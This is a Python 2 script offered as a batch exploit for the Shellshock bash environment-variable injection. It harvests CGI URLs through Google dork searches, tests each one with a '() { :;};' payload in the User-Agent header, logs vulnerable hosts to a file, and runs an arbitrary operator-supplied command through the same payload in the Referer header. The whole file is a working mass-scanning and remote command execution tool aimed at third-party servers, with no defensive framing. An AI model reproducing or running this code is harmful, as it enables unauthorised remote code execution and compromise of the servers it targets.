#! /usr/bin/env python
# -*- coding: utf-8 -*-  
#author:bulu

import requests, argparse, urllib2, re, time

def helper():
    USAGE = "python %(prog)s -d google_search\r\n\t"+"python %(prog)s -u url -e command" 
    DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google!"
    epilog = "License, requests, By bulu!"
    parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
    parser.add_argument('-u', dest='url',
                        help="Specific a target URL")
    parser.add_argument('-d', dest='dork',
                        help="Custom Google Dork,Using Google Search to find targets",
                        default="filetype:cgi inurl:cgi-bin")
    parser.add_argument('-s', dest='start',
                        type=int,
                        help="Crawl Google Page start index",
                        default=10)
    parser.add_argument('-c', dest='count',
                        type=int,
                        help="Crawl Google Page total count",
                        default=10000)
    parser.add_argument('-e', dest='cmd',
                        help="Command to Execute",
                        default="")
    return parser.parse_args()

def fileHandler(file, line):
    fp = open(file, "a")
    fp.write(line+"\r\n")
    fp.close()   

def isValidUrl(url):
    pass

def detect(url):
    r = requests.get(url, timeout=10)
    if r.status_code == 200:
        headers = {"User-Agent" : '() { :;}; echo -e "bybulu\x3abulu-scan"'}
        r = requests.get(url, headers = headers, verify = False, timeout = 10)
        if 'bybulu' in r.headers and 'bulu-scan' in r.headers['bybulu']:
            return True
        else:
            return False

def google(dork, start, count, tongji):
    for index in range(start, count, 10):
        print "[ Tips] Now the Google Page Index is "+ str(index)
        tongji.google_count_inc()
        url = "http://91.213.30.151/search?q="+urllib2.quote(dork)+"&newwindow=1&start="+str(index)+"&sa=N&bav=on.2,or.&biw=1366&bih=577&ech=1&psi=4XklVKCDDYO-PP_fgZgP.1411742200202.5&ei=43klVNrWDY3d7Qbr9oH4Dg&emsg=NCSR&noj=1"
        headers = {"User-Agent" : "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"}
        r = requests.get(url, headers = headers, timeout=20, verify = False)
        if r.status_code == 503:
            print "[ Google Error ] Blocked by Google!"
        p = re.compile("/url\\?q=(.*?)&")
        result = re.findall(p,r.content)
        for link in result:
            try:
                isvul = detect(link)
                if isvul:
                    print "[ Vul ] " + link
                    tongji.url_count_inc()
                    tongji.vul_count_inc()
                    fileHandler("vul.txt", link)
                else:
                    print "[ NoVul ] " + link
                    tongji.url_count_inc()
                    fileHandler("novul.txt", link)
                time.sleep(0.5)
            except Exception:
                pass
        time.sleep(2)
        
def exploit(url, cmd):
    isvul = detect(url)
    if isvul:
        print "[ Vul ] " + url
        headers = {"Referer":'() { :;}; echo "Content-type: text/plain"; echo; echo; '+cmd}
        r = requests.get(url, headers = headers, verify = False, timeout = 10)
        if r.status_code == 200:
            print "[ Reponse Code ] "+str(r.status_code)
            print "[ Response Header ]"  
            print r.headers
            print r.content
        else:
            print "[ Reponse Code ] "+str(r.status_code)
            print "[ Tips ] " + "Cant Open the Url, Please Try Again!"
    else:
        print "[ NoVul ] " + url
        
class Tongji():
    def __init__(self):
        self.google_count = 0
        self.url_count = 0
        self.vul_count = 0
    def google_count_inc(self):
        self.google_count += 10
    def url_count_inc(self):
        self.url_count += 1
    def vul_count_inc(self):
        self.vul_count += 1
    def result(self):
        print "GOOGLE COUNT:"+ str (self.google_count)
        print "URL COUNT:"+ str(self.url_count)
        print "VUL COUNT:"+ str(self.vul_count)
          
if __name__ == '__main__':
    args = helper()
    try:
        if args.url != None and args.cmd != "":
            exploit(args.url, args.cmd)
        else:
            tongji = Tongji()
            google(args.dork, args.start, args.count, tongji)
    except KeyboardInterrupt, e:  
        tongji.result()      
        print "Over!"
    
    